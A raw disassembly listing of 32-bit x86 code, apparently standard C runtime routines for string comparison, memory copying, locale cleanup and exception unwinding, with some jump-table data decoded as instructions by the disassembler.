  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
